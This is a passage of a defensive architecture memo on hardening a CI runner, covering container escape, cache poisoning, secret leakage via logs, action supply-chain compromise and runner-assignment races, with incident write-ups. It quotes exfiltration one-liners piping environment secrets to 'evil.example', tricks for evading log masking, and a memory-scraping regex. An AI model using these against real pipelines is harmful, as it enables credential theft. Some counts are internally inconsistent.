# The Top 10 Hardest Problems in Building a CI Runner That Users Actually Trust

> **Audience.** OpenForge platform team. Phase-1 architecture memo.
> **Stack assumed.** TypeScript monorepo, Hono API, Next.js 15, Postgres + Drizzle,
> Forgejo-derived runner (`openforge/runner`, Go) talking to a Node control plane,
> gVisor (`runsc`) as the default job sandbox, Cloudflare R2 for cache.
> **Cutoff.** Knowledge through 2026-Q3; CVEs and incidents cited with primary URLs.
> **Doctrine.** Every design choice in `runner/` and the API's `/api/runners/*`
> surface must be defensible against at least one named incident below.

This document does not summarize. It is a primary engineering reference.
Each problem has five subsections — definition, why it's hard, a concrete
real-world incident, what production runners do today, and the
opinionated OpenForge recommendation. Citations are numbered; URLs are at
the end.

---

# Problem 1. Container sandbox escape

## What the problem actually is
A CI job is, by definition, remote code execution on hardware you do not
fully trust. The job container is the boundary between *untrusted
attacker-controlled code* and *trusted tenant data* — secrets, source
from other repos, the runner daemon, sibling jobs running on the same
host, and ultimately the OpenForge control plane itself. "Trust" here
means: when a job container is destroyed, *no data leaks to a future
job*, *no host state mutates*, and *the host kernel and host filesystem
are untouched*. Failure looks like: container reads `/etc/shadow` on
the host, container writes to `/var/lib/gitlab-runner`, container
installs an SSH key into the runner daemon's `authorized_keys`, or
container pivots via `/proc/<host-pid>/mem` to a sibling runner. The
attack surface is the union of every kernel syscall the runtime
accepts, every device node passed through, every capability granted,
and every mount source visible. Container escape is *the* canonical
runner break — the entire premise of a CI sandbox is that this
boundary holds.

## Why it's hard
The container boundary is not a single check — it is a chain of
~80 Linux kernel features (namespaces, cgroups, capabilities,
seccomp-bpf, AppArmor/SELinux, Landlock, mount nosuid/nodev/noexec,
read-only rootfs, dropped capabilities, user namespacing, the
container runtime itself) that each have to be correctly configured,
correctly enforced *and* not undermined by a kernel bug. The
abstraction leaks at every layer. The runc advisory CVE-2024-21626
("Leaky Vessels", published 2024-01-31, CVSS 8.6) demonstrated that a
single ordering bug — `WORKDIR /proc/self/fd/<host-fd>` was chdir'd
*before* privileged file descriptors were closed — let a malicious
Dockerfile or `docker run` argument read and overwrite the host
filesystem [1]. The broader picture from Snyk's 2024-01 disclosure
package was four simultaneous CVEs in runc/BuildKit/Moby
(CVE-2024-21626, CVE-2024-23650, CVE-2024-23651, CVE-2024-23652,
CVE-2024-23653, CVE-2024-24557) — one in the runtime, three in the
build engine, one in the engine cache — all exploitable from a
malicious build [2]. The academic ground for why "container ≠
security boundary" is well established: NCC Group's 2022 paper
*Contain Yourself: Exploring Container Isolation Mechanisms* measured
real-world escape primitives across Docker, Podman, containerd and
runc [3]. The harder problem is that any of these primitives can be
re-introduced by a single misconfiguration — `--privileged=true`,
`/var/run/docker.sock` mounted in, `cap-add=SYS_ADMIN`, `seccomp=unconfined`,
or `--pid=host`. The defensive surface is wider than the offensive
surface, and CI runners *ask* for the offensive surface (Docker-in-Docker
is the dominant build pattern).

## Real-world citation (sandbox escape / runtime escape)
- **Date:** 2024-01-31 (advisory); exploits observed and weaponised
  in CI contexts within days.
- **Vendor / System:** Snyk / runc + Docker Engine + BuildKit + Moby
  (the "Leaky Vessels" package).
- **CVE / Advisory:** **CVE-2024-21626** (runc process.cwd and leaked
  fds container breakout, CVSS 8.6 High), plus CVE-2024-23650/1/2/3
  in BuildKit and CVE-2024-24557 in Moby.
- **What happened:** A malicious Dockerfile (or a `docker run` with a
  crafted `--workdir`) could escape the container and read/write the
  host filesystem with the daemon's privileges.
- **How it worked:** runc applied `WORKDIR` via `chdir` *before*
  closing inherited file descriptors. The hostile WORKDIR pointed at
  `/proc/self/fd/N` where `N` was a host-root fd that the engine had
  leaked to the runtime. The container's init process then `chroot`-ed
  into the host and got full read/write.
- **Lesson:** "Just use a recent container runtime" is not a defense.
  The container must be *unprivileged* and the syscall surface must be
  intercepted by something that is not the host kernel.
- **URL:** https://snyk.io/blog/cve-2024-21626-runc-process-cwd-container-breakout/
  and https://www.docker.com/blog/docker-security-advisory-multiple-vulnerabilities-in-runc-buildkit-and-moby/

## Defenses / mitigations used in production today
- **GitHub Actions** uses a hardened VM-based runner (Hyper-V on
  Windows, KVM on Linux/macOS) for *GitHub-hosted* runners — the job
  runs inside a fresh VM per job, and the VM image is rebuilt from a
  sealed golden image. For *self-hosted* runners GitHub's docs
  document the threat model explicitly: "self-hosted runners should
  not be used with public repositories" because of cross-PR
  contamination, and recommend ephemeral VMs [4].
- **GitLab CI** documents the exact escape mechanics for
  `--privileged` and `/var/run/docker.sock` mounting in their
  Docker-in-Docker guide, *and* ships `config.toml` examples that
  avoid both — recommending TLS-protected DinD on a dedicated Docker
  daemon rather than host socket binding. Their docs openly state:
  "When you share the Docker daemon, you effectively disable the
  container's security mechanisms and expose your host to privilege
  escalation" [5][6].
- **Buildkite** ships an "Elastic CI Stack" built on Packer + AWS
  AMIs, where each job runs in a freshly-spawned EC2 instance; the
  runner does *not* persist between jobs, and the agent process is
  scoped to a single build.
- **Drone** runs the Docker runner as a daemon that launches
  *ephemeral* Docker containers per pipeline step and explicitly
  warns against stateful pipelines ("Docker pipelines are ephemeral
  and do not mutate the host machine") [7].
- **Forgejo / Gitea Actions** explicitly call out that "the runner
  is deployed independently [and] there could be potential security
  issues", and document the two simple rules: don't use a runner you
  don't trust, and don't provide a runner to a repo/instance you
  don't trust [8]. Forgejo Runner (the open-source reference for
  OpenForge's own runner fork) inherits from `nektos/act` and uses
  the Docker daemon available on the host.

## What I'd need to do for OpenForge
**Ship gVisor as the default, not raw Docker.** The existing Phase 1
decision (`docs/ci-security.md` §2) is the right one — `runsc`
intercepts ~70% of syscalls in userspace and never passes them to the
host kernel, which neutralises the entire CVE-2024-21626 class
because the syscall that chdir'd into `/proc/self/fd/N` is simply
re-implemented in Go inside runsc and never reaches the host.
Concretely: (a) refuse to register a runner whose `runc` binary is
older than 1.1.12 and whose `runsc` is missing — add a
`verify_gvisor` step at registration time; (b) default every job to
`--runtime=runsc --read-only --network=none --cap-drop=ALL
--security-opt no-new-privileges --security-opt seccomp=runsc-default
--user 1000:1000`; (c) for tenants that demand VM-level isolation
(regulated industries, defence, finance) expose a per-pool
`runtime=kata` option that launches the job inside a Kata microVM
backed by cloud-hypervisor on hosts with nested virt — same Docker
CLI, just a different `--runtime`; (d) **never expose `/var/run/docker.sock`
to the job container** — DinD goes through an inner dockerd that is
isolated by a separate network namespace and does not have host
socket access. Treat docker.sock as root-on-host, because that is
what it is.

---

# Problem 2. Cache poisoning across users

## What the problem actually is
CI caches (dependency caches, Docker layer caches, test result caches)
are a *shared* key-value store that exists to reduce job latency.
"Trust" here means: when Job B in repo Y restores a cache entry that
Job A in repo X wrote, B receives *exactly what A intended to write
and nothing else* — no executable content, no modified source, no
altered binary, no injected environment variable. Failure looks like:
an attacker runs a job in repo X, writes a poisoned `node_modules/.cache/`
that contains a malicious `postinstall` payload, the next job in repo
Y restores the cache by key collision or namespace confusion, and the
malicious payload runs in Y's security context. The attack surface is
the (key, value) tuple — both sides of the lookup need to be
authenticated, and the value needs to be either trusted-by-construction
or treated as untrusted data on read. Cache poisoning is the *lateral*
container escape: it does not need to break out of the sandbox, only
break *out* of the tenant boundary.

## Why it's hard
Three reasons. First, cache keys in every production CI system are
*tenant-scoped by string*, not by cryptographic identity. GitHub
Actions keys look like `node-modules-${{ hashFiles('package-lock.json') }}`
— a hash of public inputs. If two repos have an identical lockfile,
they share the cache *and* the cache is restored into a context that
trusts it. GitHub partially mitigated this for `pull_request_target`
by making the cache read-only for that trigger [9], but the
write-then-restore primitive is still trivially abusable by a
colluding insider or by anyone who can produce the same key.
Second, *cache values are not signed*. The Docker layer cache
(CVE-2024-24557 in Moby, Feb 2024 [2]) was a textbook example: an
attacker with knowledge of the user's Dockerfile could publish a
specially crafted base image whose cache ID collides with the user's
intended upstream, and the build system would silently use the
attacker's content. The fix moved to BuildKit, but the *root cause*
— cache identity derived from public inputs — is structural.
Third, *the cache medium is privileged*: caches frequently live on
the runner host filesystem (Forgejo stores the cache on the runner,
not on the server [10]), and the job container can read whatever the
runner daemon can read. GitHub Security Lab's 2025-01 paper
*New vulnerability patterns and mitigations* documented cache
poisoning as the *expected* failure mode of `pull_request_target`
workflows with `permissions: {}` [11].

## Real-world citation (cache poisoning)
- **Date:** 2024-12-04 through 2024-12-11 (compromise window).
- **Vendor / System:** Ultralytics (the `ultralytics/yolov5` and
  `ultralytics/ultralytics` Python packages on PyPI; their CI/CD
  pipeline ran on GitHub Actions).
- **CVE / Advisory:** Tracked initially as GHSA-9c59-9wj9-5wpc and
  StepSecurity advisory, later attributed to a malicious PR
  exploiting `pull_request_target` on `format.yml` (which had
  `pull_request_target` and write permissions); cryptominer
  backdoored releases **v8.3.41** and **v8.3.42**.
- **What happened:** Attacker opened a malicious PR from a fork
  against `ultralytics/ultralytics`. The PR's code path modified
  the build cache to inject a cryptominer, which was then *signed*
  by the project's own CI and released as `v8.3.41` on PyPI.
  Approximately 1.3M downloads of the poisoned version before
  takedown.
- **How it worked:** The malicious workflow ran in the `pull_request_target`
  context (privileged), used `actions/checkout` to pull the fork's
  PR head, and the attacker's script wrote crafted entries into the
  GitHub Actions cache key namespace. When the release workflow
  (running on the trusted `push` trigger) subsequently restored that
  cache, it trusted the contents, packaged them into a wheel, and
  signed the result with the project's release signing key.
- **Lesson:** Cache writes are a *write primitive* into the trusted
  build pipeline. Any workflow that can write the cache can
  manipulate downstream builds.
- **URL:** https://www.stepsecurity.io/blog/prevent-ultralytics-style-ci-cd-security-attacks-with-network-security-controls
  and https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack/

## Defenses / mitigations used in production today
- **GitHub Actions** documents the cache-poisoning vector in their
  hardened workflow guide and makes the `pull_request_target` cache
  *read-only* by default; workflows that explicitly want cache write
  access on PRs must opt out via a `cache-mode` declaration, which
  re-introduces the risk and is documented as such [9]. The
  recommended mitigation is to use *separate workflows* for untrusted
  PR work (no cache write) and trusted post-merge work (cache write).
- **GitLab CI** uses a per-job, per-pipeline cache scope by default,
  with a separate distributed cache backend (`cache:` blocks support
  `key:files`, `key:prefix`, etc.). Shared caches are *opt-in*, and
  cache paths must be declared in the job spec — there is no implicit
  global cache.
- **Buildkite** moves the cache to an artifact store that is
  scoped by pipeline + branch + commit SHA; the cache key namespace
  is the build, not a project-wide string.
- **Drone** deliberately keeps the cache *inside* the ephemeral
  container; there is no cross-pipeline cache medium. Re-build from
  scratch every time. This trades latency for security.
- **Forgejo Runner** stores the cache *on the runner itself* — not
  on the server — and explicitly notes "the cache is stored by the
  runner itself and never sent to Forgejo" [10]. This makes the
  cache a *runner-scoped* resource, which is safer (collateral
  damage is bounded to the runner's tenant set) but does not solve
  cross-job poisoning within a runner.

## What I'd need to do for OpenForge
**Make the cache key cryptographically bound to its producer.** No
cache key in OpenForge is allowed to be a string derived from
attacker-influenced inputs (file hashes, branch names) without being
*authenticated* by the server. Concrete recipe: (a) every cache
write is a `PUT /api/cache/{tenantId}/{jobId}/{sha256(blob)}`
authenticated by the job's `requestToken`, where `tenantId` is the
org/repo pair and `jobId` is server-issued; (b) restore is a
`GET /api/cache/{tenantId}/{jobId}/{sha256(blob)}` and the value is
S3-stored with server-side encryption (SSE-KMS) plus a per-write
HMAC over `(tenantId, jobId, sha256, content)` so a corrupted blob
on R2 trips a verification error before it's restored; (c) the
cache namespace is *not* shareable across tenants, and within a
tenant it's keyed by the server's `jobId`, not by the workflow's
`hashFiles(...)` string — the workflow key is hashed again with the
job's secret on the server; (d) jobs running `pull_request_target`
(or our equivalent — `pr_target` — for OpenForge) have *read-only*
cache access by default; (e) on cache write, the server verifies
that the writer workflow runs in a `push` or trusted context before
it accepts the entry. Phase 2: switch the cache backend to R2 with
bucket-level immutability and content-addressed dedup so two
identically-keyed blobs collide to the same object.

---

# Problem 3. Secret exfiltration via workflow logs

## What the problem actually is
Workflow logs are *public by default for public repos* and *visible
to all repo collaborators for private repos*. They are the most
prolific data-egress channel in any CI system. "Trust" here means:
the *name* of a secret may appear in a log line (it must, to debug
the workflow), but the secret's *value* must never appear, must never
be derivable from what does appear, and must never be exfiltrated
through the log channel even when the attacker has arbitrary code
execution in the job. Failure looks like: `echo $GITHUB_TOKEN` in a
public log; `printenv | curl -X POST -d @- https://evil.example`;
`AWS_ACCESS_KEY_ID=$(echo $AWS_SECRET_ACCESS_KEY | rev) | base32`
printed to a log that is then rendered into HTML and indexed by
Google; or `curl ... -H "Authorization: Bearer $GITHUB_TOKEN"` to an
attacker server. The attack surface is every byte of every step's
stdout/stderr — including output that *should* be secret but is
formatted as a URL path, query string, JSON body, or error trace.
Log masking is the platform's last line of defense, and masking is
fundamentally *lossy*: any transformation (base64, reverse, chunking,
template interpolation) defeats it.

## Why it's hard
Three reasons, well documented in the wild. First, *masking is a
string-match game*. GitHub's secret scanner keeps a registry of
known secrets (added via `gh secret scan --register`) and uses
entropy to flag unknown candidates; both can be defeated by
chunked output (`echo ${S:0:4}; echo ${S:4:200}`) or by
transformations that change the entropy profile. Travis CI's
post-job scan (Trivy + detect-secrets) is better, but is a
*post-hoc* scan: if the attacker grabs the log before the scanner
runs, the secret is gone. Second, *the workflow author is the
threat* — when the author of a workflow is malicious (insider,
compromised maintainer account, attacker who got PR merged), they
can construct output that defeats masking by design. Third, *public
logs never expire on attacker time*. The Truffle Security 2024-2025
analyses of the tj-actions and Codecov incidents both showed
*months-old* public logs being parsed for secrets that were still
valid. Truffle's write-up of the tj-actions incident quantified:
of 603 secrets exposed in the attack, 466 (77%) were *temporary*
GitHub tokens that had already expired, but the remaining 137 were
long-lived credentials that were still valid at the time of
discovery [12]. The Gheist campaign reported by Wiz in October 2026
took this further — it exfiltrated secrets by *encoding them into
GitHub's own PR comments and workflow logs* (base32 encoding
defeats masking because the encoded form no longer matches the
secret regex) and downloading the logs before deleting the run [13].
The lesson: a platform can never assume that masking + deletion of
the log is sufficient; the secret must not be in the job's effective
context at all if it does not need to be.

## Real-world citation (secret leak via CI logs)
- **Date:** 2025-03-14 to 2025-03-15 (active compromise window).
- **Vendor / System:** GitHub Actions, via compromise of
  `tj-actions/changed-files` (used by ~23,000 repos) and the
  related `reviewdog/action-setup@v1`.
- **CVE / Advisory:** **CVE-2025-30066** (tj-actions/changed-files
  supply chain compromise); **CVE-2025-30154** (reviewdog/action-setup).
  GitHub Advisory **GHSA-mw4p-6x4p-x5m5**. CISA Alert
  TA25-080A.
- **What happened:** A compromised Personal Access Token on the
  `@tj-actions-bot` account was used to push a malicious commit
  (`0e58ed8671d6b60d0890c21b07f8835ace038e67`) and *retroactively
  update every existing version tag* to point at the malicious
  commit. Workflows that used `tj-actions/changed-files@v1`,
  `@v35.7.7-sec`, `@v44.5.1` (etc.) executed a payload that
  scraped CI runner process memory for `"[^"]+":{"value":"[^"]*","isSecret":true}`
  patterns, double-base64 encoded them, and *printed them to the
  workflow log*. On public repositories, the logs were public.
- **How it worked:** The malicious payload used Python's `/proc/self/maps`
  to find process memory, regexed for GitHub Actions' internal
  secret structure, then `base64 | base64 | print` to evade the
  platform's secret-scanning regex. Truffle Security's analysis
  showed 603 secrets exposed, with 256 runs across 237 repos
  still having the logs available *months* after the disclosure.
- **Lesson:** Masking is not a security boundary against an attacker
  who can transform the secret before printing it. The architectural
  fix is to keep the secret in a process the attacker does not have
  code execution in.
- **URL:** https://github.com/tj-actions/changed-files/security/advisories/GHSA-mw4p-6x4p-x5m5
  and https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction

A secondary incident worth citing:
- **Date:** 2021-09-03 to 2021-09-10.
- **Vendor / System:** Travis CI, public repository builds.
- **CVE / Advisory:** **CVE-2021-41077**.
- **What happened:** A configuration defect caused Travis CI to
  inject repository-scoped encrypted secrets into pull-request builds
  *from forks* of public repositories, in direct contradiction of
  its documented threat model. Anyone could open a PR with
  `script: env | base64 | curl ...` and exfiltrate.
- **Lesson:** The default branch was structurally wrong. The fix is
  to make the trust boundary *structural* (separate events for forks
  vs base) rather than a flag.
- **URL:** https://safeguard.sh/resources/blog/travis-ci-token-leak-retrospective-2021

## Defenses / mitigations used in production today
- **GitHub Actions** runs a secret scanner against every job log
  *after* the job completes, registers known secret formats in a
  blacklist, applies entropy heuristics, and uses *registerable*
  patterns for partner tokens. It also rotates any secret that was
  *accidentally* logged if it can be detected. As the GitHub docs
  themselves state: "this is not a true security boundary because
  secrets can be intentionally sent to the log" [14].
- **GitLab CI** supports `mask-secrets` (default on), `protect-secrets`
  (per-job scope), and explicit `secrets:` block with `file: false`
  so secrets are only env vars, never files. The CI lint tooling
  warns when a workflow likely echoes a secret.
- **CircleCI** masks env vars by default and offers context-level
  scoping. It does not have a robust post-hoc scan.
- **Travis CI** runs Trivy + detect-secrets against every job log
  and generates a *Log Scan Report* accessible to repo admins,
  masking the offending line with `*` if a candidate is detected
  [15]. Travis also documents the full enumeration of ways secrets
  leak (set -x, env, printenv, echo, php -i, git fetch errors) [15].
- **Gitea / Forgejo** mask secrets via `{{ secrets.NAME }}` template
  expansion in job env, with the same limitations as GitHub.

## What I'd need to do for OpenForge
**Never let the secret and the attacker's code share a process.**
Three layers: (1) **Server-side secret isolation.** Secrets are
delivered to the runner daemon as an *out-of-band* gRPC stream
authenticated by the per-job `requestToken` (already in the
architecture memo as `--secret`); the runner daemon injects them
into the job container's env via a *seccomp-gated helper binary*
that the job container cannot read or `exec`. The secret is never
in the job's process memory as a *file*, only as an env var
scoped to the job container; (2) **Log write-side filtering.**
The runner daemon pipes step stdout/stderr through a *transformer*
that (a) replaces any value matching a registered secret hash with
`[REDACTED]`, (b) splits multi-byte output into 1-byte slices and
checks each slice against the hash table (defeats chunked
exfiltration), (c) rejects any sequence that decodes as base32 /
base64 / hex with a server-known entropy profile (defeats
transformation exfiltration) — emit a step-level *anomaly*
warning, not a silent redaction; (3) **No-output mode for
high-value secrets.** Secrets tagged `class: high` (deploy keys,
production cloud creds) are delivered to the job via *ephemeral
sidecar* gRPC, never as env vars, so the attacker cannot
`printenv`. The step explicitly receives a *capability* ("you may
do X with this secret"), not the secret itself, and the sidecar
performs the action.

---

# Problem 4. Supply-chain attack via action dependencies

## What the problem actually is
A CI workflow is not just the YAML the user wrote — it is the
transitive closure of every third-party action it `uses:`. A
`uses: foo/bar@v1` line is a *postinstall hook* with no integrity
guarantee beyond "the tag `v1` resolved to whatever the
maintainer's repo points at". "Trust" here means: when the workflow
runs, every action that loads executes *exactly the code the user
pinned* — not whatever the action's maintainer pushed five minutes
ago, not whatever a hijacked PAT can tag, not whatever a
compromised transitive dependency tree can `require`. Failure looks
like: a typo-squat action `actons/setup-node` that 50 repos
copy-pasted from a StackOverflow answer steals tokens; a popular
action whose `v1` tag is force-moved to a backdoored commit (tj-actions,
Codecov); an action that uses `npm install` at runtime and pulls a
malicious dependency the *action's* maintainer didn't vet. The
attack surface is *the entire transitive dependency graph of every
action in the workflow* — which is exactly the surface the user's
threat model does not cover, because the user has no visibility
into what an action does when it `uses:` another action.

## Why it's hard
Four interlocking reasons. First, *the canonical pin in every
tutorial is a tag*, not a commit SHA. `actions/checkout@v4` is a
*mutable reference* — it dereferences to whatever commit `@v4` points
at *at the moment of the workflow run*. GitHub's own hardening guide
calls out "pin actions to a full commit SHA" as a defense, but this
is a developer-experience disaster and adoption is low; in the
tj-actions incident, *only* repos that had pinned to a SHA outside
the compromise window were safe, and many of the safe ones were
safe by luck (their SHA was older than the attack window). Second,
*transitive action dependencies are invisible to the workflow
author*. tj-actions/changed-files did not directly depend on
reviewdog/action-setup — it depended on tj-actions/eslint-changed-files,
which depended on reviewdog/action-setup, and the chain was three
hops deep [16]. The package ecosystem for GitHub Actions has no
`npm audit` equivalent — there is no SBOM, no lockfile, no
provenance attestation. Third, *the action registry is not the
deployment unit*. GitHub's marketplace allows anyone to publish,
and there is no upstream review. Even if you pin to a SHA, you're
trusting *the contents of that commit* — and the commit author can
be anyone. Fourth, *the attack window is the next push*. Once
the maintainer's account or PAT is compromised, every workflow
that hasn't pinned a SHA executes attacker code. The Unit 42
reconstruction of the tj-actions / Coinbase campaign found that
the initial intrusion dated back to a SpotBugs maintainer's PAT
exfiltrated via a malicious PR in December 2024 [17] — the
attack chain was a *three-month dwell* before the payload shipped.

## Real-world citation (supply-chain attack)
- **Date:** 2025-03-14 (detection by StepSecurity); compromise
  active from ~9 AM PT 2025-03-14 to ~22:00 UTC 2025-03-15.
- **Vendor / System:** `tj-actions/changed-files` GitHub Action;
  `reviewdog/action-setup@v1`. Affected ~23,000 repos directly,
  ~160,000 transitively [16][17].
- **CVE / Advisory:** **CVE-2025-30066** (tj-actions),
  **CVE-2025-30154** (reviewdog), GHSA-mw4p-6x4p-x5m5,
  GHSA-7h9x-2c8g-7qfj.
- **What happened:** Compromise of a SpotBugs maintainer's PAT via
  a malicious PR exploiting `pull_request_target` (Dec 2024) →
  promotion to `spotbugs/spotbugs` org member (Mar 2025) →
  leaked a Reviewdog maintainer PAT via a malicious workflow →
  override of `reviewdog/action-setup@v1` tag → transitive
  compromise of `tj-actions/eslint-changed-files` →
  `tj-actions/changed-files` → double-base64 secret dump to log.
- **How it worked:** Tag mutation. The attacker pushed a malicious
  commit and used the stolen PAT to *move the existing tags* to
  point at it. Every workflow using a mutable tag executed the
  payload, because GitHub resolves `uses: foo/bar@v1` to the SHA
  behind the tag at run time, and the tag changed underneath them.
- **Lesson:** Mutable tags are the supply chain. SHA pinning is the
  only mitigation that survives a tag-mutation attack.
- **URL:** https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack/
  and https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066

## Defenses / mitigations used in production today
- **GitHub** recommends pinning actions to a *full commit SHA*, not a
  tag, in their security hardening guide; supports a workflow-level
  allowlist via `actions: allow` in repo settings; and added an
  opt-in *Allowed actions* policy that restricts which actions can
  be `uses:`-ed by workflows. They also introduced *action
  provenance* attestations (Sigstore-signed SLSA provenance) and
  publish a *dependabot* for GitHub Actions versions. The
  hardening guide documents the full attack surface in §"Security
  hardening for GitHub Actions" [18].
- **GitLab CI** ships *CI/CD components* — versioned, signed,
  curated components published to the GitLab component registry;
  includes-component inherits include semantics, but with explicit
  version pins. The `include:` directive supports `ref:` for SHA
  pinning analogous to GitHub's.
- **Drone** runs pipelines defined in `.drone.yml` *committed to the
  repo*, not pulled from a registry; this means supply-chain
  attacks require committing to the repo (a much higher bar).
- **Gitea / Forgejo Actions** allow the operator to set
  `DEFAULT_ACTIONS_URL` to a *curated instance* (Forgejo's
  `data.forgejo.org`), so the resolution of `uses: foo/bar` does
  not go to the public GitHub registry by default. The docs
  explicitly warn that "if an action has `uses: foo/bar@main` it
  will clone and try to run the action found at
  DEFAULT_ACTIONS_URL/foo/bar if it exists, even if it provides
  something different than what is expected" [10] — i.e., the
  operator is responsible for curating what runs.
- **Buildkite** runs *plugins* that the operator controls and
  pins; the canonical plugin registry is a small, curated set
  maintained by Buildkite.

## What I'd need to do for OpenForge
**Three concentric defenses, all enforced at registration time.**
(1) **SHA pinning is mandatory.** The OpenForge workflow
validator (`apps/api/src/lib/workflow-lint.ts`) MUST reject any
`uses: foo/bar@<mutable>` reference at upload time; the only
accepted forms are `@<40-char-hex-sha>` or `@<semver>-<40-char-hex>`
where the SHA is server-verified against the actions registry
manifest at the time of resolution. (2) **A curated actions
registry.** OpenForge instances ship with a built-in, signed
manifest of vetted actions (mirror of Forgejo's
`data.forgejo.org` model). Workflows can only `uses:` from this
manifest unless the repo admin enables `--allow-external-actions`
and signs an attestation acknowledging the risk. (3) **Per-run
SBOM + provenance.** Every action install generates a CycloneDX
SBOM of the action's bundled code, signed with OpenForge's
Sigstore key. The runner daemon verifies the SBOM before the
action executes; if verification fails, the job is aborted with a
hard error, not a soft warning. (4) **Outbound-only action
fetch.** The runner daemon fetches actions over an egress proxy
that validates the response SHA, so a compromised runner cannot
swap an action out of band. This is structurally hostile to the
tj-actions attack: tag mutation would not affect OpenForge users
because the runner resolves `@sha` at upload time and never re-resolves
at run time.

---

# Problem 5. TOCTOU between runner registration and job pickup

## What the problem actually is
A CI job is not "given" to a runner at the moment the workflow is
triggered; the runner *polls* (or the server *assigns*), and the
window between "server selects runner R for job J" and "runner R
actually pulls J's payload and begins executing" is the assignment
race. "Trust" here means: the job that runner R begins executing is
*the same job the server assigned to R* — same `jobId`, same repo,
same commit, same secrets, same inputs. Failure looks like: the
server picks runner R but R has been replaced by an attacker who
registered a rogue runner with R's identity; or the server picks R
and a *different* rogue runner replies first to the "are you R?"
heartbeat, hijacking the assignment; or the runner R receives a
*modified* job spec after the server's last integrity check. The
attack surface is the *assignment protocol* — the API endpoints
that translate "job J exists" into "runner R runs J", every
authentication handshake, every retry, every token refresh.

## Why it's hard
Three reasons. First, *registration tokens are long-lived by
necessity*. A runner that just woke up after a maintenance reboot
needs to re-register; if the registration token rotated on a short
TTL, every reboot would be a registration outage. So the
registration token has to last longer than the longest plausible
outage — hours to days. GitLab Runner, Gitea Runner, Forgejo Runner,
Drone, Buildkite all use long-lived registration tokens (Gitea's
docs explicitly state the token is valid "until you reset the
token" [19]). The longer the TTL, the larger the window for theft.
Second, *the assignment protocol is a handshake*, not a one-shot
RPC. Server says "next job for runner R is J", runner says "ack,
fetching", server says "here's the job payload + secret", runner
executes. Every step is an opportunity for a race. Third, *the
server cannot tell who is on the other end of the TLS socket after
the handshake*. If the attacker has stolen the runner's
authentication credential, every check the server does looks
correct. The GitHub Security Lab's 2025-01 paper documented the
analogous `pull_request_target` TOCTOU: "even with approval
requirements in place, attackers can leverage the element of time
to bypass security measures. A malicious actor can submit a
seemingly harmless pull request, patiently wait for approval, and
then swiftly update the pull request with malicious code before
the workflow execution" [11]. The same shape applies to runner
assignment: the server picks R for J based on *current* state, but
the state can change between pick and execute.

## Real-world citation (TOCTOU / assignment race)
There is no single, perfectly-scoped public incident framed exactly
as "TOCTOU between runner registration and job pickup", because
operators don't publish detailed attacker timelines for runner
impersonation (it usually looks like a different problem on
incident-response day). The closest well-documented
analogous incidents are:
- **Date:** 2026-10-26 (Wiz disclosure).
- **Vendor / System:** GitHub Actions — *Gheist* automated campaign.
- **CVE / Advisory:** No CVE assigned; Wiz research "Gheist Uses
  Stolen GitHub Tokens".
- **What happened:** An attacker who already possessed a valid
  GitHub PAT (with `contents: write`) committed a workflow that
  *printed every secret in the repo's env* (base32-encoded to
  defeat masking) to the run log, then downloaded the log via
  GitHub's API and deleted the run within seconds. Because the
  malicious workflow ran with the *legitimate* user's identity,
  no runner-assignment anomaly was visible — the assignment
  protocol correctly handed the job to the right runner.
- **How it worked:** Token theft upstream; the runner
  assignment is *not* compromised because the runner is not
  impersonated — the *job's identity* is. This is the
  structurally important lesson: TOCTOU is not just about
  impersonating the runner, it is also about authenticating the
  job's claimed author.
- **Lesson:** The runner registration protocol must be paired
  with a *job-origin* authentication that is independent of the
  PAT/PK that triggered the workflow.
- **URL:** https://thehackernews.com/2026/10/gheist-uses-stolen-github-tokens-to.html

A second well-documented incident with a TOCTOU flavour:
- **Date:** 2021-04-01 to 2021-04-15 (window of exploitation).
- **Vendor / System:** Codecov bash uploader.
- **CVE / Advisory:** None assigned; Codecov customer notification
  2021-04-15.
- **What happened:** An attacker modified the Codecov bash
  uploader so that every customer's CI environment that ran it
  *during the window* exfiltrated `env` to an attacker server.
  Codecov's CI used the bash uploader as an *install-time
  dependency* of customer workflows — a TOCTOU between when the
  customer reviewed their workflow and when Codecov updated the
  bash uploader script.
- **How it worked:** Same tag-mutation pattern as tj-actions —
  attacker replaced the bash uploader content, every customer
  running `bash <(curl -s codecov.io/bash)` or equivalent picked
  up the malicious version. Bash uploader scripts do not have
  SHA pins.
- **URL:** https://blog.gitguardian.com/codecov-supply-chain-breach/

## Defenses / mitigations used in production today
- **GitHub Actions** uses a JIT-issued, short-lived *runner
  registration token* (typically 1 hour TTL) that is exchanged for
  a per-run JWT. The long-lived credential never reaches the
  network after the initial handshake — only the short-lived JWT
  does. This is exactly the pattern in OpenForge's existing
  `docs/ci-security.md` §5.
- **GitLab Runner** uses a `registration-token` (long-lived, can be
  rotated) to register, and then a per-runner `RUNNER_TOKEN` that
  is used for job pickup; the server-side `gitlab-runner register`
  flow can be re-run to rotate. There is documented advice to
  rotate on suspected compromise.
- **Gitea / Forgejo Runner** uses a *registration token* format
  "D0gvfu2iHfUjNqCYVljVyRV14fISpJxxxxxxxxxx" with no inherent TTL —
  the operator must rotate manually via the web UI
  (`re-create a new one using the token reset link`) [19]. The
  OpenForge docs explicitly say "the token from the environment
  is valid until you reset the token" — i.e., until manual
  rotation, indefinitely.
- **Buildkite** uses a *per-agent* registration token with a TTL
  configurable by the operator; combined with each agent's
  per-job *organization JWT* for the actual job pickup.
- **Drone** uses a one-time registration token exchanged for a
  long-lived agent secret; the server tracks registered agents and
  refuses duplicate registrations.

## What I'd need to do for OpenForge
**Make the registration → heartbeat → job-pickup chain
non-spoofable by an attacker who controls the wire.** Concretely:
(1) **mTLS for runner registration**, not just a bearer token.
The runner daemon presents a server-issued client certificate at
TLS handshake time, signed by OpenForge's internal CA, and the
server refuses any connection where the client cert does not chain
to a runner it just registered. An attacker with a stolen bearer
token cannot complete the TLS handshake. (2) **Server-side
job-snapshot signing.** When the server assigns a job to runner R,
it signs the *entire job payload* (repo, commit, workflow SHA,
secrets) with a per-runner key derived from the runner's
registration; the runner verifies the signature before executing.
An attacker who can rewrite the job payload in transit cannot
produce a valid signature for a runner that is not theirs. (3)
**Job-pickup as a challenge–response**, not a poll. The server
sends a one-time nonce to runner R; the runner signs the nonce
with its session key and returns the signature; the server
verifies and returns the job. There is no "the first one to
respond wins" race. (4) **Token TTL**: the bearer token issued at
